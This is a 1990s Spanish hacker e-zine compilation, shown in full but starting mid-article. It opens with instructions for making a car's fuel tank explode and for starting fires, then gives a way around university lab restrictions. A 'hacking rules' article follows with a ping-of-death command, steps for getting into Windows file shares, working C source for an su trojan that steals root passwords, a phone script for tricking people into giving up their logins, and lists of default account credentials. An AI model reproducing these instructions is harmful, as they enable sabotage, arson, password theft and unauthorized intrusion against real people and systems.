tu pellejo si se te ocurre meter la bola en el dep¢sito mal sellada.

        b.  Se obtienen c psulas se gelatina y se les a¤ade un peso para
hacer que se hundan. Luego se le a¤aden pequenos trozos de sodio y carbonato
de calcio a las capsulas. Entonces las c psulas se mantienen en una bolsa
pl stica para mantenerlas secas y libres de humedad.
Se introducen tres o cuatro capsulas en el dep¢sito del autom¢vil y en
cuesti¢n de minutos las capsulas se desintegrar n produciendo un gas
explosivo que a su vez provocara otro buuummm!


                                5.- Otros:

        Muchos productos tales como el f¢sforo, cuando no est  en agua,
pueden causar incendios. Unas cuantas gotas de aceite en cloro pueden causar
un incendio en 20 minutos o antes, dependiendo de la frescura del cloro.

        Experimenta y descubre nuevos explosivos, y por supuesto, no te
guardes tus descubrimientos, compartelos con todos para que los investiguemos,
hey! pon tu granito de arena a la investigaci¢n de este arte. Un arte poco
com£n eso s¡.

ÉÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍËÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ»
º Nota:  Todo lo  explicado en este  art¡culo es º       Vive la vida        º
º difundido  tan   s¢lo   con  fines   p£ramente º     prueba la muerte      º
º cient¡ficos y educativos.  Si por alguna raz¢n º     pero no te pases      º
º se le ocurre a alguien llevar a cabo alguno de º que te puedes quedar all¡ º
º los experimentos aqu¡ detallados yo no me hago ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹
º responsable  de  las  consecuencias  que  este º  Cosillas a:              º
º hecho pudiera acarrear.                        º     mrnexus@cyberdude.com º
ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÊÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

           Como Ejecutar aplicaciones desde Netscape (X Version)
                                  Por jabm


   Este truco es especial para aquellos que tienen acceso a Internet 
desde centros de computos en sus universidades y en las que no los dejan 
usar aplicaciones como Mirc o Telnet. Para esto voy asumir que trabajan 
sobre Windows 3.x (aunque funcionan sobre Win95) y cualquier version de 
Netscape. 
- Entra en la opcion del Netscape de Options,
- Selecciona General Preferences
- Selecciona la pestaña de Helpers, aparace un cuadro con los diferentes 
tipos de archivos que el netscape puede manejar y la accion que debera 
ejecutar al encontrarse con cada tipo de archivo. 
- Busca este tipo de archivo es la lista : "Aplication/Octet-Stream           
exe, bin", seleccionalo... Luego tomas la opcion de abajo que se llama 
Launch Aplication y en el espacio para escribir que esta arriba pones 
esta ruta C:\WINDOWS\WINFILE.EXE", haces click en aceptar y listo. Ahora 
vete a FILE (Archivo) y selecciona "Open file..." y busca el archivo que 
quieras ejecutar, apararecera un cuadro de dialogo como esos que 
apareces cuando estas bajando algo y al terminar se ejecutara el 
programa que tu quieres.

Que hace? Lo que hace es que le dice al netscape que cuando encuentre un 
archivo tal ejecute la Aplicacion que tu le diste. como le dices que 
ejecute el WINFILE.EXE, el netscape usara el winfile para ejecutar el 
archivo que tu le diste y dejara activos ambos, cosa que nos sirve para 
ejecutar otras cosas o modificar algunas cosas de la Pc.

Broncas: 

* El muy cabron que cuida el Centro de Computo renombro el WINFILE.EXE.
     Bien trata de hacer esto: Elije "Open File", te pone todo el disco 
duro, busca el COMMAND.COM y abrelo, te dara una ventana de MS-Dos, y 
quitale todos los atributos, cierra esa ventana y regresa... y trata de 
nuevo.

* :) que no sabes como quitar atributos y cerrar ventanas??? no jodas!! 
bien..
Attrib -a -h -r -s   (a lo primero)
Exit                         (a lo segundo)

* No se abrio el programa que quieres pero si el winfile? Hmm no es tan 
probable orque puse todos los pasos correctos, erpo aun asi tienes el 
winfile a tu disposicion, busca el archivo y correlo. OJO Winfile no 
reconoce Nombres largos, asi que si usas win95 y kieres hacer este truco 
asegurate de bajar el archivo dentro de un direcotior con nombre normal.

La verdad te ahorras en friego de broncas si traes en un disco estos 
archivos.
WINFILE.EXE
ATTRIB.EXE
COMMAND.COM

Bueno eso es todo, solo es cuestion de que traten de hacerlo, nomas que 
si los cachan pues ya es bronca de ustedes. 

Use it.. Not abuse it

                                jabm
                        forbid_me@hotmail.com
(Mentadas, citas con sus hermanas,
                  xxx passwords, guitarras electricas, flamas, etc)


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

		      **********************************		      			*  ReGLaS BaSiKaS DeL "HaCKiNG"  *
		      *      TaNTo eN WiNDoWS-95       *
                      *          KoMo eN LiNuX         *
                      *                                *
                      *            PoR: HooK           *
		      **********************************


*.Nota del autor --> HooK No Se HaCe ReSPoNSaBLe DeL uSo De eSTa iNFoRMaCioN,
La KuaL TieNe KoMo oBJeTiVo, FiNeS eDuKaTiVoS, No DeLiKTiVoS... aSi Ke Ya Lo
SaBeS "LeKToR", oJiTo, PoRKe DeSDe aHoRa Tu eReS eL uNiKo ReSPoNSaBLe!!!


Hola a todos !!!

Este es mi primer artikulo ke va dedikado al mundo del "uNDeRGRouND"!!!; es
decir ke aun estoy bastante verde para presumir de ser hacker; por ahora soy
 "aPReNDiZ De HaCKeR" ;))

En este artikulo, lo ke kiero "explikar" es, una serie de "trukos, reglas,
pasos" (Komo kerais llamarlo. XD). para hacer "Hacking".
Espero recibir kriticas de kualkier tipo en mi E-mail, espero ke juntos
podamos aprender algo nuevo...

Tambien puedes visitar mi WeB, OK¿? ;oD

	Mi E-mail es --> kikeb@arrakis.es
	Mi WeB --> http://www.arrakis.es/~jebg/hook

			
			----------=====----------


	[]--> Kontenido: <--[]
----------------------------------------------------------------------


1. Komo hackear por medio de WiNDoWS-95 ¿?¿?
	_  Telnet
	_  FTP
	_  HTTP
	_  Tracert
	_  Ping (Ping de la muerte)
	_  NBTSTAT

2.  Komo hackear un UNIX ¿?¿?
	_  Herramientas;
	_  Buskando un Objetivo o Victima;
	_  Pillar alguna Cuenta para poder entrar en ese Sistema;
		* "Ingenieria social" 
		* "Kuentas por Defecto"
		* "Fichero passwd de los sistemas UNIX" 
		* "PHF"
                * "Xploits que te dan Shells y hasta la cuenta de Root" ;o)                             
	_  Borrando tus Huellas;

3.  Despedida.

			----------=====----------



1. Komo hackear por medio de WiNDoWS-95 ¿?¿?
Pues, primeramente, si lo ke kieres es hackear de verdad, dejate del
ventanukos-95 y pasate a lo ke todo el mundo (Ke sabe de esto) rekomienda!!!,
osea Linux.

¿Porque?, pues porque Linux ofrece un abanico de posibilidades en el kampo de
la komunikacion, y ademas es un S.O ke tiene una verdadera y muy buena opcion
de multi-tarea y multi-usuario...

Pero si lo ke kieres es hackear por medio de Windows-95, pos ala, halla tu!!!
Lo primero ke tienes ke saber es ke posibilidades te da tu mismo S.O WiNDoWS-95,
es decir, ke programas vienen predeterminados kon tu WiNDoZe, los kuales,
algunos utiles son:

_  TeLNeT --> es un cliente o protokolo el kual nos servira para konektar
              kon otro ordenador.

	El telnet ke Windoze nos pone en mano es muy facil de usar, teniendo
        una ventana propia kon un interfaz grafiko muy comodo y sencillo. Si
        ejecutamos telnet lo unico que tenemos que hacer es pinchar en la
        opcion "Conectar" y alli apretar a   la opcion "Sistema remoto...",
        kon lo ke te aparecera otra ventana en   la que te saldra tres
        opciones;

	_  La opcion 1 "Nombre de host" en donde se pone a ke ordenador
           keremos konektarnos.
	_  La opcion 2 "Puerto" en donde pondremos el puerto por donde
           keramos konektarnos, (El puerto predeterminado es el 23).
	_  La opcion 3 "tipo de terminal"  ke no hace falta kambiarlo.

"A kontinuacion pongo una lista (ReSuMiDa) de los puertos mas komunes:"
	auth (113)
	conference (531)
	courier (530)
	daytime (13)
	discard (9)
	domain (53)
	echo (7)
	efs (520)
	exec (512)
	finger (79)
	ftp (21)
	gopher (70)
	hostnames (101)
	http (80)
	ingreslock (1524)
	link (87)
	login (513)
	mtp (57)
	nameserver (42)
	netbios (139)
	netnews (532)
	netstat (15)
	nntp (119)
	pop2 (109)
	pop3 (110)
	proxy (8080)
	qotd (17)
	remotefs (556)
	rje (77)
	sftp (115)
	shell (514)
	smtp (25)
	spooler (515)
	sunrpc (111)
	supdup (95)
	systat (11)
	telnet (23)
	tempo (526)
	tftp (69)
	time (37)
	uucp (540)
	uucp-path (117)
	whois (43)
	www (80)

_  FTP --> File Transfer Protocol. Windoze lleva un FTP incorporado, pero
 	este, a diferencia del Telnet, corre solamente bajo MS-DoS.
	El FTP nos sirve para subir o bajar ficheros y nos puede ayudar mucho
        en nuestra aventura "HaCkeR". (Jeje, por ejemplo, kon este programa,
        nos podremos pillar el famoso archivo passwd explikado mas a
        delante... XDD)
	Para ejecutarlo hay ke irse a una ventana de MS-DoS y en el PRoMPT
        (C:\WINDOWS) ponemos, ftp, kon lo ke se aktivara el "Modo FTP".
        Luego para konektar kon alguna makina por medio de FTP pondremos,
        open <IP- de la Viktima>
	Si no sabes utilizar el FTP del ventanas-95, escribe "?" o "help" y
        te saldran todos los comandos disponibles del FTP.

_  HTTP --> Windows inkorpora un servidor HTTP (Su famoso internet
        explorer) el kual es un navegador ke nos puede servir mucho.
        Por ejemplo, kon el podremos sakar el archivo de pass de un servidor
        mediante kon el famoso bug "PHF" el kual se explikara mas adelante.
_  Tracert --> Sirve para kalkular el tiempo ke tarda un pakete de un
        servidor hasta otro; ademas podemos saber por cuantos servidores
        pasa.
	Muy util para sacar servidores "viktimas". }:)
	Para usar el tracert, abrimos una ventana MS-DOS y escribimos tracert
        <IP-de la victima>.
	Si kieres ver las opciones ke tiene tracert escribe tracert y sakara
        el menu de opciones. (Saldra algo asi...)

Usage:tracert [-d] [-h maximum_hops] [-j host-list] [-w timeout] target_name

  Options:
       -d                 Do not resolve addresses to hostnames.
       -h maximum_hops    Maximum number of hops to search for target.
       -j host-list       Loose source route along host-list.
       -w timeout         Wait timeout milliseconds for each reply.

_  Ping --> Sirve principalmente para saber si un servidor esta aktivo;
 	ademas podemos kalkular el trafiko en la red segun el tiempo de su
        respuesta.
	Pero kon el ping, tambien se puede hacer una teknika llamada "El
        Ping De La Muerte". };)
	Konsiste en enviar un pakete a un servidor, este nos kontesta; pero
        si el pakete enviado es muy grande, puede llegar desordenado, por lo
        ke el servidor pide al origen ke le vuelva a enviar una parte o la
        totalidad del pakete, por lo ke producira la kaida del servidor.
        Para ejecutar este atake, abriremos una ventana de MS-DoS en donde
        eskribiremos ping -l 65510 <viktima.com>

_  NBTSTAT --> Programa muy util, ke el propio windows nos pone en bandeja,
 	el kual nos va a servir para kolarnos en algun Disco duro ¡KOMPARTIDO!
        de kualkier ordenador.
	Esto kiere decir ke podremos ver archivos de una persona, siempre y
        kuando esten Kompartidos y no haya ninguna kontraseña ke los proteja.
        Pero para esto, debemos tener bien konfigurado nuestro WiNDoWS.

	* Konfiguracion !!!
	_  Debemos tener activadas las opciones "Compartir ficheros e
                impresoras", se aktivan en "Mi PC", luego en "Panel de Control",
                y luego en "Red". Si el botón está desaktivado pulsamos
                AÑADIR y añadimos el servicio "Compartir ficheros e impresoras
                en redes Microsoft"
                En la misma ventana, debemos tener el "Primer inicio de
                sesión" en "Cliente para redes Microsoft"
	_  Tambien debemos tener también el "Cliente para redes Microsoft",
           ke viene por defecto, en "Mi PC", luego en "Acceso telefónico a
           redes", luego a "Conexión a iNet" en donde pulsaremos el boton
           derecho del mouse y pincharemos en propiedades. Debe estar
           activada la kasilla "Conectarse a la red".

	_  Luego reiniciamos y ya podemos ponernos manos a la obra...

*  Komo se usa !!!
	_  Nos vamos a una ventana de MS-DoS y ponemos:
         nbtstat -A <IP- de la 	victima>. Entonces nos saldra algo komo esto:
    
	NetBIOS Remote Machine Name Table

    Name               Type         Status
    ---------------------------------------------
    VIKTIMAMACHINE    <00>    UNIQUE     Registered
    VIKTIMAGROUP      <00>    GROUP      Registered
    VIKTIMAMACHINE    <03>    UNIQUE     Registered
    VIKTIMAMACHINE    <20>    UNIQUE     Registered
    VIKTIMAGROUP      <1E>    GROUP      Registered

    MAC Address = 44-45-53-54-00-00

	En esta tabla se refleja la informacion de la viktima, en donde el
        primer 'UNIQUE' de tipo <00> es el nombre de la viktima y komo puedes
	ver la makna se llama "VIKTIMAMACHINE".

	_  Entonces ahora nos vamos al direktorio de Windows (si es ke no
           estas en el) y creamos/editamos el archivo LMHOSTS; en el ponemos
           la direccion IP, luego un tabulador o un espacio y luego el nombre
           de la makina en cuestion.

	Seria de la siguiente forma:

		c:\WINDOWS>edit LMHOSTS
 
		<IP-de la viktima>	VIKTIMAMACHINE
	
	_  Una vez hecho esto, te sales de MS-DoS y te vas a Buscar PC, (En
           "Inicio", "Buscar", "PC"). Alli pones el nombre del ordenador
           (Rekuerda, en este ejemplo es "VIKTIMAMACHINE") y le das a "Buscar
           ahora"

	Te saldra un icono kon el nombre del ordenador en kuestion y no
        tienes mas ke pinchar en el, kon lo ke te saldra lo ke la viktima
        tiene kompartido, y si no tiene kontraseña, podras urgar en el, Jeje.  }:D

*Nota! --> También puedes usar MS-DoS, para ver ke tiene kompartido y moverte
 por alli, pero aki te lo muestro para ke te muevas por ese P.C kompartido de
 una forma mas komoda.




2.  Komo hackear un UNIX ¿?¿?
Bien, esta parte es (Para mi) la mas interesante de todas; ya hemos dejado el
hacking en WiNDoZe, y empezamos kon kosas algo mas serias.
Para entender lo siguiente tendras ke tener unos konocimientos minimos de
UNIX, porke lo ke se explica a kontinuacion es principalmente para UNIX.

_  Herramientas;
Pues para poder hackear algo se necesitan "Rekisitos minimos", aunke no todo
lo ke te voy a decir se necesita al 100%...

Necesitaras:
Telnet --> Ya esta explikado.

FTP --> Ya esta explikado.

Finger --> Es una utilidad ke viene ya en linux, (Ojo en Windows no viene
 	ningun finger, tendras ke bajartelo de alguna pagina).
	El finger se utiliza para obtener informacion de algun host. Por
        ejemplo, podemos sacar Login's de usuarios y empezar a adivinar sus
        passwords. ;)
	Además te informa sobre el sistema al ke le haces el Finger.
        
Whois --> Al igual ke el Finger esta disponible en linux, pero en Windows no.
	Es muy parecido al Finger, el Whis proporciona tambien informacion,
        pero dicha informacion es diferente a la del finger.
        
Skaneador de puertos --> Programa ke rastrea los puertos ke tiene abierto un
 	host determinado. Tendrás ke bajarte alguno de Inet, tanto si estas
        en Windoze, como en linuxZ. (Te rekomiendo PortScan)

Sniffers --> Es un programa que monitoriza los paquetes de datos que
 	circulan por una red. Lo ke hace el sniffer es chequear paketes en
        busca de informacion referente unas cadenas prefijadas por el que ha
        instalado el programa.
	Aki te dejo el kodigo de un Sniffer "Nittie":


		--------------==Corta aqui==--------------
/***
 ***
 *** author   : beavis & butthead 
 ***
 *** nittie.c : checks for a vnode with major/minor similar 
 ***            to /dev/nit. i.e. reports if there is a sunsniffer.
 ***
 *** compile  : cc -o nittie nittie.c -lkvm
 ***
 *** include  : all header files about disclaimers and that kind of rubbish.
 ***
 *** "bugs"   : it checks 'kmem' for such vnodes therefore there is no
 ***            guarantee that it will cue for all sniffers.
 ***            the intruder might have modified 'kmem' already.
 ***
 *** advntges : better than cert's 'cpm' because the sniffer can be
 ***            reading in normal (non promiscuous) mode from /dev/nit
 ***            and nittie.c will sense this.
 ***
 ***/
                   

#include <stdio.h> 
#include <errno.h>
#include <nlist.h>
#include <pwd.h>

#include <sys/time.h>
#include <kvm.h>

#define KERNEL
#include <sys/file.h>
#include <fcntl.h>
#include <sys/proc.h>
#undef KERNEL

/* the following lines are stollen from <sys/vnode.h> */

enum vtype      { VNON, VREG, VDIR, VBLK, VCHR, VLNK, VSOCK, VBAD, VFIFO };

struct vnode {
        u_short         v_flag;                 /* vnode flags (see below) */
        u_short         v_count;                /* reference count */
        u_short         v_shlockc;              /* count of shared locks */
        u_short         v_exlockc;              /* count of exclusive locks */
        struct vfs      *v_vfsmountedhere;      /* ptr to vfs mounted here */
        struct vnodeops *v_op;                  /* vnode operations */
        union {
                struct socket   *v_Socket;      /* unix ipc */
                struct stdata   *v_Stream;      /* stream */
                struct page     *v_Pages;       /* vnode pages list */
        } v_s;
        struct vfs      *v_vfsp;                /* ptr to vfs we are in */
        enum vtype      v_type;                 /* vnode type */
        dev_t           v_rdev;                 /* device (VCHR, VBLK) */
        long            *v_filocks;             /* File/Record locks ... */
        caddr_t         v_data;                 /* private data for fs */
};

/* down to here */


#define NIT_MAJ     0x2800
#define MAJ_MASK    0xff00
#define MIN_MASK    0x00ff
#define FALSE       0
#define TRUE        1

#define k_read(x, y, l) \
           if (kvm_read(kd, (unsigned long)x, (char *)y, (unsigned)l) < 0) \
              { perror("kvm_read"); exit(1); }

int    cnt = 0;
kvm_t *kd;

int CheckFile(pUsrFile)
struct file *pUsrFile;
{
   struct vnode vn;

   if ((pUsrFile->f_count == 0) || (pUsrFile->f_data == NULL))
      return FALSE;
   
   k_read(pUsrFile->f_data, &vn, sizeof(struct vnode));

   if ((vn.v_type == VCHR) && ((vn.v_rdev & MAJ_MASK) == NIT_MAJ)) {
      printf("open NIT with major/minor: %d / %d\n",
             ((vn.v_rdev >> 8) & MIN_MASK), (vn.v_rdev & MIN_MASK));
      
      printf("NIT open() flags: %s%s\n", 
             (((pUsrFile->f_flag) & _FREAD) ? "READ " : ""),
             (((pUsrFile->f_flag) & _FWRITE) ? "WRITE" : ""));
      
      return TRUE;
   }
   return FALSE;

}

void userSearch(userProc)
struct proc *userProc;
{

#define MAX_CWD_LEN 1024

   int            flg;
   char         **usrArg;
   struct file  **ppFile, *pCurFile, curFile;
   struct user   *pUsrEnv;
   struct passwd *pUsrInfo;
   struct ucwd    usrCurDir;
   char           szCD[MAX_CWD_LEN];

   
   pUsrEnv = kvm_getu(kd, userProc);
   ppFile = pUsrEnv->u_ofile;

   if (ppFile) do {
      
      k_read(ppFile++, &pCurFile, sizeof(struct file *));

      if (pCurFile == NULL)
         continue;

      k_read(pCurFile, &curFile, sizeof(struct file));
      
      if (flg = CheckFile(&curFile)) {
         cnt++;

         pUsrInfo = getpwuid(userProc->p_uid);
         if (pUsrInfo)
            printf("user: %s (%s)\n", pUsrInfo->pw_name, pUsrInfo->pw_gecos);
         else
            printf("userid: %d\n", userProc->p_uid);
      
         k_read(pUsrEnv->u_cwd, &usrCurDir, sizeof(struct ucwd));
         k_read(usrCurDir.cw_dir, szCD, MAX_CWD_LEN);
         printf("starting dir: %s\n", (szCD[0] ? szCD: "/"));

         kvm_getcmd(kd, userProc, pUsrEnv, &usrArg, NULL);
         if (usrArg) {
            printf("program:");
            while (*usrArg != NULL) printf(" %s", *usrArg++);
            puts("");
         }
         else
            puts("can not find program's args");
            
         printf("pid: %d\n", userProc->p_pid);
         
         puts("---");
      }
   } while (pCurFile && !flg);
}


main(argc, argv)
int    argc;
char **argv;
{
   struct proc *pCurProc;
 
   if (!(kd = kvm_open(NULL, NULL, NULL, O_RDONLY, NULL))) {
      perror("kvm_open");  
      exit(1);
   }
   
   kvm_setproc(kd);
   while ((pCurProc = kvm_nextproc(kd)) != NULL) 
      userSearch(pCurProc);
   
   if (!cnt)
      puts("can not sense anyone reading from the NIT");
   else
      printf("total: %d process%s using NIT\n", cnt, (cnt == 1 ? "" : "es"));

   kvm_close(kd);
}

                --------------==EnD oF CuT==--------------




Xploits --> Son rutinas ke se usan para "Explotar" algun bug del
            sistema en donde te enkuentres. (Ojo, si estas dentro un Linux,
            version Red Hat 5.0, tendras ke usar algun Xploit ke sea para
            dicha version, debido a ke si el Xploit ke ejecutes en ese linux
            no es de la version Red Hat 5.0 probablemente no funcione).
            Te rekomiendo ke tengas tus Xploits por orden de sistemas
            operativos, y si eres mu ordenao por orden de S.O y versiones
            correspondientes.     :o)

	Mas a delante te he puesto el kodigo de algunos Xploits ke puede ke
        aun vayan...

Troyano --> Un troyano es un programa que modifica su funcion habitual para
 	conseguir algun objetivo que nos interese. En principio, una de las
        utilidades mas importantes de los troyanos es dejar backdoors.

	Aki te dejo kon el kodigo del SU, un troyano ke ataka al komando SU.
        (Este komando sirve para ke kuando el root de un sistema este
        trabajando kon la cuenta de algun usuario (Shell), y kiera kambiar de
        esa kuenta a la de RooT, pues lo haga kon el komando SU, para ganar
        tiempo).

	Lo ke ahi ke hacer kon este troyano es kompilarlo y meterlo en un
        direktorio, luego ese direktorio lo ponemos en el path de manera que
        este antes que el directorio por defecto donde esta el komando su.
        Por  ejemplo: si el path es: PATH=/bin/:/sbin/.........
        y el directorio del troyano es: /.troyano
        Tendria que ponerse: PATH=/.troyano:/bin:/sbin......
        Asi el troyano estara listo para ke kuando la viktima ke este kon
        una Shell kiera kambiar a root por medio del komando SU, el troyano
        se aktive; la viktima pondra su klave de root para hacerse root,
        pero lo ke estara haciendo es darsela al troyano, de modo ke este
        imprime un mensaje en pantalla komo este: "Password Incorrect" y
        luego se  desaktivara; entonces la viktima (al ver ese mensaje) se
        pensara ke ha  puesto mal su klave y volvera a intentarlo.
        El kodigo de este mostruito es el siguiente... ;o)

		--------------==Corta aqui==--------------


/* su trojan ribbed - by FA-Q
 * werd to lwn for his help.
 * mkdir .elm
 * cc -o ~/.elm/su su.c
 * edit .bash_profile or .bashrc
 * add PATH=$HOME/.elm:$PATH
 */

#include <stdio.h>
#include <stdlib.h>

#define SU_PASS "/tmp/.rewt"

main (int argc, char *argv[])
{
   char *key;
   char buf[24];
   FILE *fd;

   key = (char *)getpass ("Password:");
   fd = fopen(SU_PASS,"w");
   fprintf(fd, "pass: %s\n", key);
   fclose(fd);
   printf ("su: incorrect password\n");
   sprintf(buf, "rm %s", argv[0]);
   system(buf);
   exit (1);
}

		--------------==EnD oF CuT==--------------




ZAP: Es un programa que se usa para borrar las huellas en un sistema.
     Estos programas son tambien llamados Zappers.
	Mas a delante enkontraras el kodigo de un Zapper, el Zap2.
        Jeje, pa ke no te me kejes eh¿? XDD

_  Buskando un Objetivo o Viktima;
Bien, pues komo se deduce y se sabe, antes de nada, habra ke saber a kien
se kiere hackear.
Se habra de recoger la maxima informacion sobre la viktima, por ejemplo
ke puertos tiene abiertos ese P.C, tendras ke tener algo vigilado al root,
etc...
Bien, todo esto no es del todo necesario, pero ayudara en nuestros propositos.
Tambien tendras ke saber en ke S.O estas hackeando, para ello tendras ke
saber algunos "rasgos tipikos" de algunos sistemas UNIX komo Linux, solaris,
Irix, etc... pero no me voy a entretener en poner rasgos sobre distintos
sistemas, es algo ke tendras ke saber, y punto.

Tendras ke saber komo funciona ese S.O, ya ke si no sabes komo funciona,
 ¿Ke koño vas a hacer?

_  Pillar alguna Cuenta para poder entrar en ese Sistema;
Esto es algo importante en la aventura de un hacker, ya ke si no tienes
una cuenta no podras hacer nada. Hay dibersos bugs ke kon el Xploit
korrespondiente te pueden dar Shells, e inkluso la kuenta del Super
usuario (RooT).
A kontinuacion se diran unas cuantas "teknicas" de komo konseguir
una kuenta en un Sistema:

* "Ingenieria social" --> Es un metodo en donde no se necesita ni un
ordenador, ni saber UNIX, ni nada por el estilo, lo ke se necesita es
imaginacion. :)
Kon esta teknika podras sakarle a la gente kontraseñas de internet,
shells, u otras kosas.
Konsiste en hacer ke la victima te diga su contraseña!!!
Es algo muy facil, pero klaro para esto te tienes ke inventar una buena
historia para ke la viktima pike.

Hay muchas formas de hacer ingenieria social, algunas de ellas, son:
_  Enviar un mail anonimo diciendole a la victima ke necesita su login y
   password para un asunto de la compañia, o algo asi, yokese, jeje
_  Hacerse pasar por la tipika chica inocente y novata ke se akaba de
   konektar por primera vez y no tiene ni puta idea.
_  Llamar por teléfono y kontarle un rollo hasta ke eskupa lo ke keramos.
   jiajia. }:)

A parte de estos hay muchos mas.
Esto puede llegar a ser mu divertido... XD
A kontinuacion te pondre un ejemplo con la teknika de la llamada de
telefono;

Personajes de este ejemplo:
	HooK --> Hacker.
	Pepito --> Victima.

- HooK llama desde kualkier sitio a la kasa de Pepito -
- Riiiiiiinnnggggg!!!-Riiiiiinnnnnggggg!!!; Suena el telefono.... -

<Pepito> ¿Diga?
<HooK> Hola buenas tardes, es la kasa del señor Pepito Gonzalez.
(Es necesario saber algunos datos de la viktima en kuestion)
<Pepito> Si, soy yo, ¿Ke desea?
<HooK> Vera, me llamo Manolo Garcia, y llamo desde ARRAKIS, donde usted esta
       dado de alta, ¿no?
<Pepito> Si señor, asi es.
<HooK> Pues vera, le llamaba porque hemos tenido una serie de problemas kon
 	los ordenadores del servidor, y hemos perdido mas de la mitad de los
        datos de kasi todos nuestros usuarios, incluido usted. Entonces
        ahora estamos reconstruyendo nuestra base de datos de los usuarios y
        en su seccion faltaban varios datos que parece ser que se han perdido.
        (Jeje, utiliza palabras algo teknikas...).
        Podria decirme los siguientes datos ke le voy a pedir a kontinuacion...
<Pepito> Muy bien.
<HooK> Me puede decir su numero de DNI; Kuando hace ke se konecto a nuestro
       proveedor; bla, bla, bla, su Login y Password ke en un principio se
       le dio; bla, bla, bla... (Komo ves le preguntamos un par de kosas y
       luego el Login y Pass, luego le preguntamos otro par de kosas para ke
       no kante mucho y yasta. :)))
<Pepito> Mi dni es tal tal, me conecte hace tal tiempo, bla, bla, bla, mi
 	Login es tal y mi Password es XXXXX, bla, bla,bla...
<HooK> Muy bien. Gracias y disculpe las molestias. Ha sido muy amable
       (Tendras ke ser algo edukado no cres¿?¿? ;ş)
<Pepito> No hay de que.
<HooK> De aqui a unos dias se le volvera a comunicar la situacion de nuestro
       proveedor, ¿deacurdo?
<Pepito> Deacuerdo.
<HooK> OK, Gracias de nuevo y Adios.
<Pepido> Adios.
- Pepito kuelga el telefono y HooK tiene otro login y password - Jujauja...

¿Has visto ke facil es?
Solo tienes ke darle imaginacion. jiji. ;D

* "Kuentas por Defecto" --> Este es un metodo algo pesado y ke tendras ke
tener mucha suerte para ke te funcione, ya ke raramente funcionan. (Te
rekomiendo ke utilices esta tecnika kuando hayas usado ya otros metodos
menos pesados y no te hayas salido kon la tuya)
Aki te dejo una lista de cuentas, pero ya te he avisado, es muy pesado y
necesitaras suerte...

	-= Cuentas por defecto para kuealkier UNIX en general =-

-= Login =-	-= Password =-
  adm
  admin
  ann
  anon
  anonymous	anonymous
  backup
  batch
  bin
  checkfsys
  daemon 
  demo
  diag
  field
  ftp
  games
  guest		guest
  guest		anonymous
  help
  install
  listen
  lp
  lpadmin
  maint
  makefsys
  mountfsys
  network
  news
  nobody
  nuucp
  nuucpa
  operator
  powerdown
  printer
  pub
  public
  reboot
  rje
  rlogin
  root
  sa
  setup
  shutdown
  startup
  sync
  sys		sys
  sysadm
  sysadmin
  sysbin	sysbin   sysbin/bin
  sysman
  system
  tech
  test
  trouble
  tty
  umountfsys
  user		user   
  user1		user1
  uucp
  uucpa
  visitor
  root		root
  root		system
  sys		sys
  sys		system
  daemon	daemon
  uucp		uucp
  tty		tty
  test		test
  unix		unix
  unix		test
  bin		bin
  adm		adm
  adm		admin
  admin		adm
  admin		admin
  sysman	sysman
  sysman	sys
  sysman	system
  sysadmin	sysadmin
  sysadmin	sys
  sysadmin	system
  sysadmin	admin
  sysadmin	adm
  who		who
  learn		learn
  uuhost	uuhost
  guest		guest
  host		host
  nuucp		nuucp
  rje		rje
  games		games
  games		player
  sysop		sysop
  root		sysop
  demo		demo
  decnet	dennet
  guest		friend
  field		service
  guest		welcome
  system	manager
  default	user
  decnet	nonpriv
  field		digital
  field		test
  postmaster	mail
  sysmaint	service
  sysmaint	digital
  system	operator
  system	manager
  system	syslib
  system	uetp
  systest_clig	systest
  userp		user
  sysadmin	admin
  daemon	daemon
  sysbin	sysbin 

	-= Cuentas por defecto para AIX =-

-= Login =-	-= Password =-
  guest		guest

	-= Cuentas por defecto para DECserver =-

-= Login =-	-= Password =-
  Access
  System

	-= Cuentas por defecto para VMS =-

-= Login =-	-= Password =-
  autolog1	autolog o autolog1
  cms		cms
  cmsbatch	cms o cmsbatch
  erep		erep
  maint		maint o maintain
  operatns	operatns o operator
  operator	operator
  rscs		rscs
  smart		smart
  sna		sna 
  vmtest	vmtest
  vmutil	vmutil
  vtam		vtam
  field		service
  systest	utep
  systest_clig	systest
  systest_clig	uetp

	-= Cuentas por defecto para PRIME =-

-= Login =-	-= Password =-
  Prime		prime
  Prime		primos
  Primos	primos
  Primos	prime
  primos_cs	prime
  primos_cs	primos
  primenet	primenet
  system	system
  system	prime
  system	primos
  netlink	netlink
  test		test
  guest		guest
  guest1	guest

	-= Cuentas por defecto para SGI Irix =-

-= Login =-	-= Password =-
  4DGifts
  guest
  demos
  lp
  nuucp
  tour
  tutor
  accounting
  boss
  demo
  manager
  pdp8
  pdp11
  software

* "Fichero passwd de los sistemas UNIX" --> Este archivo (passwd) es el
fichero en donde se enkuentran todas las kontraseñas, kon sus respenctivos
logins de todo el sistema.
Komo podrás apreciar, es praktikamente una especie de "objetivo principal",
ya ke pillando ese archivo tendras todas las klaves, y mas tarde las podras
desenkriptar.
La estructura de un archivo "passwd" es el siguiente:

root:21gCqQc/zPWgU:0:0:Super-User:/:/bin/csh
sysadm:*:0:0:System V Administration:/usr/admin:/bin/sh
diag:*:0:996:Hardware Diagnostics:/usr/diags:/bin/csh
daemon:*:1:1:daemons:/:/dev/null
bin:*:2:2:System Tools Owner:/bin:/dev/null
uucp:*:3:5:UUCP Owner:/usr/lib/uucp:/bin/csh
sys:*:4:0:System Activity Owner:/var/adm:/bin/sh
adm:*:5:3:Accounting Files Owner:/var/adm:/bin/sh
lp::9:9:Print Spooler Owner:/var/spool/lp:/bin/sh
